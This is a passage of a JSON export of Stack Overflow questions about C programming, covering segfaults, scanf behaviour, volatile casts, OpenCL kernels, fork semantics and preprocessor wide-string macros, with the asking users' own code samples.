rowsize=r*2+1;\n    int colsize=c*2+1;\n\n    /* memory alloc of rows */\n    p **matrix=malloc(rowsize*sizeof(p *));\n    int k;\n    for(k=0; k&lt;rowsize; k++)\n    {\n        /* memory alloc of columns */\n        matrix[k]=malloc(colsize*sizeof(p));\n    } \n    int i, j;\n    for(i=0; i&lt;rowsize; i++)\n    {\n        for(j=0; j&lt;colsize; j++)\n        {\n            /* columns is between letters */\n            if(j%2!=0)\n        {   \n                matrix[i][j].size_t=7;\n                matrix[i][j].c=malloc(8*sizeof(char));\n                strcpy(matrix[i][j].c,\"       \");\n        }\n        else if(i%2==0 &amp;&amp; j%2==0)\n            {\n                matrix[i][j].size_t=1;\n                matrix[i][j].c=malloc(sizeof(char));\n                *(matrix[i][j].c)='a';\n            }\n            else\n            {\n                matrix[i][j].size_t=1;\n                matrix[i][j].c=malloc(sizeof(char));\n                *(matrix[i][j].c)=' ';\n            }\n        }\n    }       \n    return matrix;\n}\n\nvoid\nprintMatrix(p **matrix, const int r, const int c)\n{\n    int rowsize=r*2+1;\n    int colsize=c*2+1;\n    printf(\"\\n\");\n    int i, j;\n    for(i=0; i&lt;rowsize; i++)\n    {\n        printf(\"\\t\");\n        for(j=0; j&lt;colsize; j++)\n        {\n            if(matrix[i][j].size_t==1)\n                printf(\"%c\", *matrix[i][j].c);\n            else\n                printf(\"%s\", matrix[i][j].c);\n\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n }\n</code></pre>\n\n<h3>main.c</h3>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include \"something.h\"    \n\nvoid\nprintMenufunction(p **matrix, int rows, int cols)\n{\n    int rowsize=rows*2+1;\n    int colsize=cols*2+1;\n    /* memory alloc of rows */\n    matrix=malloc(rowsize*sizeof(p *));\n    int i;\n    for(i=0; i&lt;rowsize; i++)\n    /* memory alloc of columns */\n        matrix[i]=malloc(colsize*sizeof(p));\n    matrix=createMatrix(rows, cols);\n}\n\nint\nmain(void)\n{\n    int rows, cols;\n    p **matrix;\n    char *stringtemp;\n    printf(\"ask for row and col in form (5x5):\\n\");\n    scanf(\"%s\", stringtemp);\n    sscanf(stringtemp, \"%dx%d\", &amp;rows, &amp;cols);\n    printMenufunction(matrix, rows, cols);\n    printMatrix(matrix, rows, cols);\n    return 0;\n}\n</code></pre>\n\n<p>This simplified version throws me an segmentation fault. I don't understand where I'm trying to access memory not assigned? Can someone please explain it? (SSCCE)</p>\n"},{"tags":["c","gstreamer","alsa","gst"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13277315,"title":"How to trim the GStreamer registry?","body":"<p>My registry.arm.bin is 600 KB large, and every time my application starts, it takes  ~ 0.25 seconds to read and parse it.\nThe problem is that i don't need all the plugins that are located there.\nI only want almost all of the plugins for AUDIO, and none for VIDEO.</p>\n\n<p>How can i trim down my registry, so i reduce it size and loading time ?</p>\n"},{"tags":["c","json"],"answer_count":5,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":2357,"score":7,"question_id":6673936,"title":"Best Way To Parse JSON in C?","body":"<p>I'm currently working on a command-line utility written in C called <a href=\"http://tiggerlovesdevs.com\">Tigger</a>\nand I'm trying to find a good way to parse JSON in C. </p>\n\n<p>I really don't need a huge library or anything, I would rather have something small and lightweight with a bare minimum of features, but good documentation. </p>\n\n<p>Does anyone have anything they can point me to? Thanks in advance!</p>\n"},{"tags":["c","compiler-errors"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":39,"score":-4,"question_id":13276764,"title":"Why do I get \"error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘int’\" ?","body":"<blockquote>\n  <p>processpairs2.c:7: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘<strong>attribute</strong>’ before ‘int’</p>\n</blockquote>\n\n<p>Is the error I get everytime I compile my file, the error references me to line 7, which is where I declare the <code>main()</code> function.</p>\n\n<p>my main's function is declared as </p>\n\n<pre><code>int main(int argc, char *argv[])\n</code></pre>\n\n<p>does anyone know what's causing this?</p>\n\n<p>any help is greatly appreciated.</p>\n\n<p>line 1-6 is</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#define ROWS 4\n#define COLS 10\nvoid checkhighestpair();\nint *ptotal, *pval1, *pval2\n</code></pre>\n"},{"tags":["c","excel","menu","pic","datafile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":21,"score":-4,"question_id":13273092,"title":"Excel data file for menu program","body":"<p>I have written a menu program in C for a PIC24 microcontroller, using the Microchip MPLAB X IDE. The menus are constructed from a data file at runtime. The data file is currently an Assembler file which is linked with the C program file, but it is difficult to maintain. What I would like to do is build the data file in an Excel spreadsheet then export it in some way (.csv ?) and add it to the menu project, but don’t know how to go about this. Bearing in mind that the data file contains variable and function identifiers contained in the program. Any help to get started in the right direction would be appreciated.</p>\n"},{"tags":["c++","c","if-statement"],"answer_count":5,"favorite_count":2,"up_vote_count":8,"down_vote_count":0,"view_count":106,"score":8,"question_id":13264279,"title":"Execution direction of && Condition","body":"<p>I have been taught that for every C function arguments, Rightmost argument will be executed/processed first and it progresses towards left.\nRight part will be executed first and it progresses towards left.</p>\n\n<p>Is this applicable to conditions like &amp;&amp; and || ??</p>\n\n<p>If I am writing a C++ Code, I check for NULL condtion first and then in next if I perform my action. for e.g.</p>\n\n<pre><code> if( CommDevice != NULL)\n   {\n      if(CommDevice-&gt;isOpen == TRUE)\n         { \n                //Do Something\n         }\n\n   }\n</code></pre>\n\n<p>Can I convert this in <code>if((CommDevice != NULL) &amp;&amp; (CommDevice-&gt;isOpen == TRUE) )</code> </p>\n\n<p>That \"Code executes from Right to Left\" fear is stopping me coz what if <code>CommDevice</code> is NULL and I am trying to access a member of NULL.  It will generate exception.</p>\n"},{"tags":["c++","c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":13275162,"title":"C & C++ String Literal Deprecation for char * = \"stringLiteral\";","body":"<p>I understand that the syntax <strong>char * = \"stringLiteral\";</strong> has been deprecated and may not even work in the future. What I don't understand is <strong>WHY</strong>.  </p>\n\n<p>I searched the net and stack and although there are many echos confirming that char * = \"stringLiteral\"; is wrong and that <strong>const</strong> char * = \"stringLiteral\"; is corect, I have yet to find information about WHY said syntax is wrong. In other words, I'd like to know what the issue really is under the hood.</p>\n\n<h2><strong>ILLUSTATING MY CONFUSION</strong></h2>\n\n<p><strong>CODE SEGMENT 1 - EVIL WAY (Deprecated)</strong></p>\n\n<pre><code>char* szA = \"stringLiteralA\";     //Works fine as expected. Auto null terminated.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \nszA = \"stringLiteralB\";          //Works, so change by something same length OK.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \nszA = \"stringLiteralC_blahblah\"; //Works, so change by something longer OK also.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \n\nOuput:\nstringLiteralA\nstringLiteralB\nstringLiteralC_blahblah\n</code></pre>\n\n<p>So what exactly is the problem here?  Seems to work just fine.</p>\n\n<p><strong>CODE SEGMENT 2 (The \"OK\" way)</strong></p>\n\n<pre><code>const char* szA = \"stringLiteralA\";  //Works fine as expected. Auto null term.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \nszA = \"stringLiteralB\";          //Works, so change by something same length OK.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \nszA = \"stringLiteralC_blahblah\"; //Works, so change by something longer OK also.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \n\nOuput:\nstringLiteralA\nstringLiteralB\nstringLiteralC_blahblah\n</code></pre>\n\n<p>Also works fine. No difference. What is the point of adding const?</p>\n\n<p><strong>CODE SEGMENT 3</strong></p>\n\n<pre><code>const char* const szA = \"stringLiteralA\";  //Works. Auto null term.\nstd::cout &lt;&lt; szA &lt;&lt; std::endl;    \nszA = \"stringLiteralB\";           //Breaks here. Can't reasign.\n</code></pre>\n\n<p>I am only illustrating here that in order to read only protect the variable content you have to const char* <strong>const</strong> szA = \"something\"; .</p>\n\n<p>I don't see the point for deprecation or any issues. Why is this syntax deprecated and considered an issue?</p>\n"},{"tags":["c++","c"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":13276568,"title":"Equality operand behavior for unsigned and signed types","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5416414/signed-unsigned-comparisons\">Signed/unsigned comparisons</a>  </p>\n</blockquote>\n\n\n\n<p>So I have the below code, which sets an unsigned int to a negative number, and then does a comparison of the unsigned int with the same negative number. The output I get is \"Not Equal\".  I understand that when setting the unsigned int to -1, the value of the unsigned int is set to 255 in this case. </p>\n\n<p>However, what causes the equality operand to return false?  And also, what is the reasoning behind having different conversion rules for the '==' and '=' operands which causes this behavior? I assume this is standard behavior across all platforms but I am using g++ on Linux.</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;iostream&gt;\n\nint main(int argc, char **argv)\n{\n  uint8_t test = 0;\n  int8_t set = -1;\n\n  test = set;\n\n  if (test == set) {\n    std::cout &lt;&lt; \"Equal\";\n  } else {\n    std::cout &lt;&lt; \"Not Equal\";\n  }\n}\n</code></pre>\n"},{"tags":["c","windows","device-driver","usb-flash-drive"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":397,"score":3,"question_id":4766573,"title":"USB blocking using minifilter driver (passThrough)","body":"<p>I am writing a mini-filter code for USB (Flash Drives) for blocking i.e (Access Denied).So, could someone help me out,  how to detect or block USB or what methods to use in passThrough WDK sample code for <strong><em>USB detection and USB blocking</em></strong>? </p>\n\n<p>I am trying to use *IOCTL_STORAGE_QUERY_PROPERTY in PFLT_INSTANCE_SETUP_CALLBACK*. Am i on right path?? if yes then how to use IOCTL_STORAGE_QUERY_PROPERTY in PFLT_INSTANCE_SETUP_CALLBACK??? </p>\n"},{"tags":["python","c","python-c-api","python-c-extension"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13276145,"title":"Python C extension - Receiving a dict as argument","body":"<p>I'm writing a C extension and I'm quite lost on how to receive a dict as an argument. As the docs don't have any specifics on how to achieve this I tried to parse the argument as a Python Object and then manipulate it as a dict:</p>\n\n<pre><code>PyTypeObject *dict;\n\nif(!PyArg_ParseTuple(args, \"o\", &amp;dict))\n    return NULL;\n</code></pre>\n\n<p>But the code fails on the parsing:</p>\n\n<pre><code>Python 2.7.2 (default, Jun 20 2012, 16:23:33) \n[GCC 4.2.1 Compatible Apple Clang 4.0 (tags/Apple/clang-418.0.60)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import plotting\n&gt;&gt;&gt; plotting.plot({'wff':0})\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: must be impossible&lt;bad format char&gt;, not dict\n</code></pre>\n\n<p>As far as I can understand from the error message the format char is wrong (I thought \"o\" should represent any Python object).</p>\n\n<p>What is the best way to parse a Python dict to a C pointer? I'm digging through the documentation but I haven't found anything similar to this.</p>\n\n<p>Thank you.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":74,"score":3,"question_id":13275417,"title":"Why scanf(\"%d\", [...]) does not consume '\\n'? while scanf(\"%c\") does?","body":"<p>Here <a href=\"http://stackoverflow.com/questions/217074/parsing-input-with-scanf-in-c\">parsing input with scanf in C</a> I saw this statemente in the accepted answer:</p>\n\n<blockquote>\n  <p>Most of the conversion specifiers skip leading whitespace including newlines but %c does not.</p>\n</blockquote>\n\n<p>For me it is not clear the rationale under this different behaviours, I would have expected a uniform one (e.g. always skipping or never).</p>\n\n<p>I came into this kind of problem with a piece of C code like this:</p>\n\n<pre><code>#include \"stdio.h\"\n\nint main(void){\n\nchar ch;\n    int actualNum;\n\nprintf(\"Insert a number: \");\nscanf(\"%d\", &amp;actualNum);\n    // getchar();\n\nprintf(\"Insert a character: \");\nscanf(\"%c\", &amp;ch);\n\nreturn 0;\n}\n</code></pre>\n\n<p>Swapping the two scanf solve the problem, as well as the (commented) getchar, otherwise the '\\n' of the first insertion would be consumed by the second scanf with %c. I tested on gcc both on linux and windows, the behaviour is the same:</p>\n\n<blockquote>\n  <p>gcc (GCC) 4.7.2 20120921 (Red Hat 4.7.2-2)\n  Copyright (C) 2012 Free Software Foundation, Inc.\n  This is free software; see the source for copying conditions.  There is NO\n  warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</p>\n</blockquote>\n\n<p>Could someone please help me elaborating this a bit deeper? </p>\n\n<p>Thanks in advance,\nAlessandro</p>\n"},{"tags":["c","arrays","casting","volatile"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":102,"score":6,"question_id":13199364,"title":"Meaning of volatile for arrays and typecasts","body":"<p>Folks,</p>\n\n<p>Consider this (abominable) piece of code:</p>\n\n<pre><code>volatile unsigned long a[1];  \nunsigned long T; \n\nvoid main(void) \n{    \n    a[0] = 0x6675636b;   /* first access of a */\n    T = *a; \n    *(((char *)a) + 3) = 0x64; /* second access of a */\n    T = *a;\n}\n</code></pre>\n\n<p>...the question: is <code>((char *)a)</code> volatile or non-volatile?</p>\n\n<p>This begs a larger question: should there be a dependence between the two accesses of a?  That is, human common sense says there is, but the C99 standard says that volatile things don't alias non-volatile things -- so if <code>((char *)a)</code> is non-volatile, then the two accesses don't alias, and there isn't a dependence.</p>\n\n<p>More correctly, C99 6.7.3 (para 5) reads:</p>\n\n<blockquote>\n  <p>\"If an attempt is made to refer to an object defined with a volatile-qualified type through use of an lvalue with non-volatile-qualified type, the behavior is undefined.\"</p>\n</blockquote>\n\n<p>So when we typecast <code>a</code>, does the volatile qualifier apply?</p>\n"},{"tags":["c","matrix","opencl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13262646,"title":"OpenCL transpose kernel how is get_local_id being used","body":"<p>Code taken from a sample. I created a project with it and it works, but I don't understand some parts. </p>\n\n<p>For the sake of the example, say I have a 32x32 matrix, there are 36 work items and so get_global_id(0) goes from 0 -> 35 I presume, and size = MATRIX_DIM/4 = 8. </p>\n\n<pre><code>__kernel void transpose(__global float4 *g_mat,\n   __local float4 *l_mat, uint size) {\n\n   __global float4 *src, *dst;\n\n   /* Determine row and column location */\n   int col = get_global_id(0);\n   int row = 0;\n   while(col &gt;= size) {\n      col -= size--;\n      row++;\n   }\n   col += row;\n   size += row;\n\n   /* Read source block into local memory */\n   src = g_mat + row * size * 4 + col;\n   l_mat += get_local_id(0)*8;\n</code></pre>\n\n<p>In the <code>clEnqueueNDRangeKernel</code> call, the arg <code>local_work_size</code> was set to <code>NULL</code> which according to the manual means let the compiler or something figure it out:</p>\n\n<p><code>local_work_size can also be a NULL value in which case the OpenCL implementation will determine how to be break the global work-items into appropriate work-group instances.</code></p>\n\n<p>But I don't understand the multiply by 8, which gives an address offset into local memory for the work group I suppose. Can someone please explain this?</p>\n\n<pre><code>   l_mat[0] = src[0];\n   l_mat[1] = src[size];\n   l_mat[2] = src[2*size];\n   l_mat[3] = src[3*size];\n\n   /* Process block on diagonal */\n   if(row == col) {\n      src[0] =\n         (float4)(l_mat[0].x, l_mat[1].x, l_mat[2].x, l_mat[3].x);\n      src[size] =\n         (float4)(l_mat[0].y, l_mat[1].y, l_mat[2].y, l_mat[3].y);\n      src[2*size] =\n         (float4)(l_mat[0].z, l_mat[1].z, l_mat[2].z, l_mat[3].z);\n      src[3*size] =\n         (float4)(l_mat[0].w, l_mat[1].w, l_mat[2].w, l_mat[3].w);\n   }\n   /* Process block off diagonal */\n   else {\n      /* Read destination block into local memory */\n      dst = g_mat + col * size * 4 + row;\n      l_mat[4] = dst[0];\n      l_mat[5] = dst[size];\n      l_mat[6] = dst[2*size];\n      l_mat[7] = dst[3*size];\n\n      /* Set elements of destination block */\n      dst[0] =\n         (float4)(l_mat[0].x, l_mat[1].x, l_mat[2].x, l_mat[3].x);\n      dst[size] =\n         (float4)(l_mat[0].y, l_mat[1].y, l_mat[2].y, l_mat[3].y);\n      dst[2*size] =\n         (float4)(l_mat[0].z, l_mat[1].z, l_mat[2].z, l_mat[3].z);\n      dst[3*size] =\n         (float4)(l_mat[0].w, l_mat[1].w, l_mat[2].w, l_mat[3].w);\n\n      /* Set elements of source block */\n      src[0] =\n         (float4)(l_mat[4].x, l_mat[5].x, l_mat[6].x, l_mat[7].x);\n      src[size] =\n         (float4)(l_mat[4].y, l_mat[5].y, l_mat[6].y, l_mat[7].y);\n      src[2*size] =\n         (float4)(l_mat[4].z, l_mat[5].z, l_mat[6].z, l_mat[7].z);\n      src[3*size] =\n         (float4)(l_mat[4].w, l_mat[5].w, l_mat[6].w, l_mat[7].w);\n   }\n}\n</code></pre>\n"},{"tags":["c","expression","token"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13275751,"title":"expected expression before '{' token","body":"<p>I am getting: \"error: expected expression before '{' token\" for the line I've commented before. If the struct is already defined why would it need a \"{\" before token. Thanks for any help you can provide.</p>\n\n<pre><code>struct sdram_timing {\n    u32 wrdtr;\n    u32 clktr;\n};\n\nint calibration(void);\nunsigned char read_i2c_cal(void);\nstatic unsigned int eepcal[15];\n\nmain() {\n    DQS_autocalibration();\n}\n\nint calibration(void)\n{\n    struct sdram_timing scan_list[30];\n\n    read_i2c_cal();\n    if(eepcal[0] == 0){\n\n       scan_list = {{eepcal[1], eepcal[2]}, {-1, -1}}; // &lt;-- PROBLEM LINE\n\n        }\n        else {\n            //foo\n        }\n\n    return 0;\n}\n\nunsigned char read_i2c_cal(void) {\n    eepcal[0] = 0;\n    eepcal[1] = 02;\n    eepcal[2] = 03;\n}\n</code></pre>\n"},{"tags":["c++","c","casting"],"answer_count":4,"favorite_count":0,"up_vote_count":7,"down_vote_count":1,"view_count":106,"score":6,"question_id":13275834,"title":"Unexpected result in byte representation of a variable","body":"<p>I scan through the byte representation of an int variable and get somewhat unexpected result.</p>\n\n<p>If I do</p>\n\n<pre><code>int a = 127;\ncout &lt;&lt; (unsigned int) *((char *)&amp;a);\n</code></pre>\n\n<p>I get 127 as expected. If I do</p>\n\n<pre><code>int a = 256;\ncout &lt;&lt; (unsigned int) *((char *)&amp;a + 1);\n</code></pre>\n\n<p>I get 1 as expected. But if I do</p>\n\n<pre><code>int a = 128;\ncout &lt;&lt; (unsigned int) *((char *)&amp;a);\n</code></pre>\n\n<p>I have <strong>4294967168</strong> which is, well… quite fancy. </p>\n\n<p>The question is: is there a way to get 128 when looking at first byte of an int variable which value is 128?</p>\n"},{"tags":["c","linux","gcc","types","stdint"],"answer_count":1,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":4072,"score":8,"question_id":3597743,"title":"Where is ptrdiff_t defined in C?","body":"<p>Where is <code>ptrdiff_t</code> defined in C? If non-trivial, how can I make this type visible from GCC on Linux?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":287,"score":0,"question_id":5413527,"title":"scanf() is getting skipped","body":"<p>Hi\nJust started learning c for uni (usually use objective c) and have run into a strange issue with scanf, i have the following code</p>\n\n<pre><code>   while(stringCheck == 0){\n    scanf(\"%c\",&amp;computerType);\n    computerType = toupper(computerType);\n\n    if ( computerType == 'L') {\n        /*set stringCheck to 1 so the scanf while loop breaks*/\n        stringCheck = 1; \n        counter = 0;\n    } else {\n        printf(\"ERROR\\n\");\n    }\n}\n</code></pre>\n\n<p>This i printing out \"ERROR\" then asking for input (so it is skipping the scanf statment the first time). If i change the it to another variable that is a string it works fine, it stops on the first time.</p>\n\n<p>The rest of the code works fine, its just the fact that it print an error as soon as it enters the loop that is annoying.</p>\n\n<p>I have tried <code>getChar()</code> and it does the same thing.</p>\n\n<p>Thank you for any help you have to offer.</p>\n"},{"tags":["c","gcc","openmp","libgomp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13261560,"title":"Make GCC to call pthread_exit while transforming OpenMP parallel code","body":"<p>I just found that gcc's OpenMP implementation (libgomp) doesn't call pthread_exit().\nI need that to use perfsuite (for profiling).</p>\n\n<p>Is there any way to tell GCC to include pthread_exit() at the end of a parallel section of OpenMP while transforming the OpenMP code to pthread codes?</p>\n\n<p>I am using GCC 4.7.0 and Perfsuite 1.1.1 .</p>\n"},{"tags":["c++","c","compiler","llvm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13275577,"title":"Inserting a block between two blocks in LLVM","body":"<p>I want to insert a block in between two basic blocks in LLVM. So for example, if a basic block A was jumping to basic block B, I want to insert a basic block C in between them such that A jumps to C and C jumps to B. How can I do that? I do have the basic idea that I need to change the terminating instruction of Basic Block A, such that the target B is replaced by C, but how do I go on adding the new basic block C in between?</p>\n"},{"tags":["objective-c","c","cocoa","xcode4.5","unistd.h"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13269528,"title":"Compile file from inside the application with execl","body":"<p>I'm trying to compile a file from my application,with this action:  </p>\n\n<pre><code>- (IBAction)build:(id)sender\n{\n    pid_t pid=fork();\n    int status;\n    if(!pid)\n    {\n        execl(\"/Developer/usr/bin/gcc\",\"-o main ~/main.c\");\n        exit(0);\n    }\n    waitpid(pid, &amp;status, 0);\n}\n</code></pre>\n\n<p>The file main.c in my home directory is not compiled (I don't find the executable).<br>\nAnd I would know:<br>\n1)How to pass arguments to gcc? I am passing ~/main.c, but I would like to pass the filename with full path of my document.How do I get the NSDocument's filename?<br>\n2)How do I get the console output?I also need to print the gcc output, how to do this?</p>\n\n<p>Edit: I modified the code to compile the file saved from the application:  </p>\n\n<pre><code>- (IBAction)build:(id)sender\n{\n    NSTask *task = [[NSTask alloc] init];\n    [task setLaunchPath:@\"/Developer/usr/bin/gcc\"];\n    [task setArguments: @[@\"-o\",@\"main\",[self fileURL]] ];\n    NSPipe *pipe = [NSPipe pipe];\n    [task setStandardOutput:pipe];\n    NSFileHandle *file = [pipe fileHandleForReading];\n    [task launch];\n    NSData *data = [file readDataToEndOfFile];\n    NSString *output = [[NSString alloc] initWithData:data\n                                             encoding:NSUTF8StringEncoding];\n    NSLog (@\"gcc output:\\n%@\", output);\n}\n</code></pre>\n\n<p>But whenever the build method gets executed that's what I get:  </p>\n\n<pre><code>2012-11-07 19:04:30.636 Coder[1856:303] -[NSURL fileSystemRepresentation]: unrecognized selector sent to instance 0x100154c40\n2012-11-07 19:04:30.638 Coder[1856:303] -[NSURL fileSystemRepresentation]: unrecognized selector sent to instance 0x100154c40\n2012-11-07 19:04:30.642 Coder[1856:303] (\n    0   CoreFoundation                      0x00007fff95b060a6 __exceptionPreprocess + 198\n    1   libobjc.A.dylib                     0x00007fff909793f0 objc_exception_throw + 43\n    2   CoreFoundation                      0x00007fff95b9c6ea -[NSObject(NSObject) doesNotRecognizeSelector:] + 186\n    3   CoreFoundation                      0x00007fff95af45ce ___forwarding___ + 414\n    4   CoreFoundation                      0x00007fff95af43b8 _CF_forwarding_prep_0 + 232\n    5   Foundation                          0x00007fff8cbf8e67 -[NSConcreteTask launchWithDictionary:] + 814\n    6   Coder                               0x0000000100001734 -[Document build:] + 452\n    7   AppKit                              0x00007fff8d266a59 -[NSApplication sendAction:to:from:] + 342\n    8   AppKit                              0x00007fff8d2668b7 -[NSControl sendAction:to:] + 85\n    9   AppKit                              0x00007fff8d2667eb -[NSCell _sendActionFrom:] + 138\n    10  AppKit                              0x00007fff8d264cd3 -[NSCell trackMouse:inRect:ofView:untilMouseUp:] + 1855\n    11  AppKit                              0x00007fff8d264521 -[NSButtonCell trackMouse:inRect:ofView:untilMouseUp:] + 504\n    12  AppKit                              0x00007fff8d263c9c -[NSControl mouseDown:] + 820\n    13  AppKit                              0x00007fff8d25b60e -[NSWindow sendEvent:] + 6853\n    14  AppKit                              0x00007fff8d257744 -[NSApplication sendEvent:] + 5761\n    15  AppKit                              0x00007fff8d16d2fa -[NSApplication run] + 636\n    16  AppKit                              0x00007fff8d111cb6 NSApplicationMain + 869\n    17  Coder                               0x00000001000011a2 main + 34\n    18  libdyld.dylib                       0x00007fff93a577e1 start + 0\n    19  ???                                 0x0000000000000003 0x0 + 3\n)\n</code></pre>\n\n<p>trojanfoe code was working, but with this modification it doesn't work.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13275258,"title":"Printing char buffer in hex array","body":"<p>I am reading 512 chars into a buffer and would like to display them in hex. I tried\nthe following approach, but it just outputs the same value all the time, despite\ndifferent values should be received over the network.</p>\n\n<pre><code>  char buffer[512];\n  bzero(buffer, 512);\n  n = read(connection_fd,buffer,511);\n  if (n &lt; 0) printf(\"ERROR reading from socket\");\n  printf(\"Here is the message(%d): %x\\n\\n\", sizeof(buffer), buffer);\n</code></pre>\n\n<p>It has been a while my last C programming experience, but is it possible that here I am outputting the address of the buffer array, rather than its content? Is there an easy way in C for this taks or do I need to write my own subroutine?</p>\n\n<p>Thanks, Patrick</p>\n"},{"tags":["c","visual-studio-2010","process","pipes","fgets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13256421,"title":"fgets returns empty","body":"<p>From a parent process, I am trying to control a child process through standard input/output.\nI used the following MSDN example to create the child process and redirect its standard input &amp; output : <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms682499%28v=vs.100%29.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682499%28v=vs.100%29.aspx</a></p>\n\n<p>On the parent side I send the same \"command\" twice using the following code:</p>\n\n<pre><code>const char cmd[] = \"test\\n\";\nDWORD written, read;\nBOOL success;\nsuccess = WriteFile(g_hChildStd_IN_Wr, cmd, sizeof(cmd), &amp;written, NULL);\nsuccess = WriteFile(g_hChildStd_IN_Wr, cmd, sizeof(cmd), &amp;written, NULL);\n</code></pre>\n\n<p>On the child side, I read those commands through a <strong>fgets</strong> call.\nThe first command is read as expected. But when the second command is sent, the fgets call returns with an empty string and the next fgets call does not return. Here is the child process code:</p>\n\n<pre><code>char *retStrP;\nchar str[256];\nsize_t strLen;\n\nretStrP = fgets(str, 256, stdin);\nstrLen = strlen(str);\nif (retStrP != str)\n{\n    char errorStr[256];\n    int a = feof(stdin);\n    int b = ferror(stdin);\n    sprintf(errorStr, \"Fgets error, %d %d\\n\", a, b);\n    OutputDebugString(errorStr);\n}\nelse if (strLen == 0)\n{\n    char errorStr[256];\n    int a = feof(stdin);\n    int b = ferror(stdin);\n    sprintf(errorStr, \"Strlen is 0, %d %d\\n\", a, b);\n    OutputDebugString(errorStr);\n}\n</code></pre>\n\n<p>From the previous code, the second call to fgets behaves as follow: the returned pointer is equal to the str buffer but the strlen is 0.</p>\n\n<p>When reading the MSDN fgets documentation ( <a href=\"http://msdn.microsoft.com/en-us/library/c37dh6kf%28v=vs.100%29.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/c37dh6kf%28v=vs.100%29.aspx</a> ), I don't see any way it could return the pointer to the buffer passed as the first argument with the first buffer's byte being set to 0 (as far as the buffer size is greater than 1).\nIf an error occurs or the end of file is reached, the fgets should return NULL and either feof or ferror should return something not 0.</p>\n\n<p>I suspect something is going wrong with the pipes handling but I can't figure out what... From the parent side, I don't do anything more with the stdin write pipe than sending the same buffer twice.\nAny idea what could cause such a behaviour?</p>\n"},{"tags":["c","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13274786,"title":"How to modify a global variable in child fork?","body":"<p>In fork child, if we modify a global variable, it will not get changed in the main program.</p>\n\n<p>Is there a way to change a global variable in child fork?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint glob_var;\n\nmain (int ac, char **av)\n{\n  int pid;\n\n  glob_var = 1;\n\n  if ((pid = fork()) == 0) {\n    /* child */\n    glob_var = 5;\n  }\n  else {\n    /* Error */\n    perror (\"fork\");\n    exit (1);\n  }\n\n  int status;\n  while (wait(&amp;status) != pid) {\n  }\n   printf(\"%d\\n\",glob_var); // this will display 1 and not 5.\n}\n</code></pre>\n"},{"tags":["c","c-preprocessor"],"answer_count":1,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":54,"score":8,"question_id":13275015,"title":"C preprocessor Literal Construction","body":"<p>My problem is as follows:</p>\n\n<p>I have a string literal that is macro-ed like so</p>\n\n<pre><code>#define TITLE \"Title\"\n</code></pre>\n\n<p>But there are instances when I need to pass in a wide char variant of this string. I want to be able to pass <code>L\"Title\"</code> to those functions. So naturally, I set out trying to define a new macro <code>W_TITLE</code> in terms of <code>TITLE</code>.</p>\n\n<p>But I have no luck, all my approaches (listed bellow) have failed. Please tell me how such magic can be accomplished.</p>\n\n<p>I tried</p>\n\n<pre><code>#define W_TITLE L##TITLE\n#define W_TITLE #L TITLE\n#define W_TITLE ##L TITLE\n</code></pre>\n\n<p>But they all fail...</p>\n"},{"tags":["c","char","arduino"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":72,"score":-2,"question_id":13260801,"title":"Arduino - How do I copy char* into 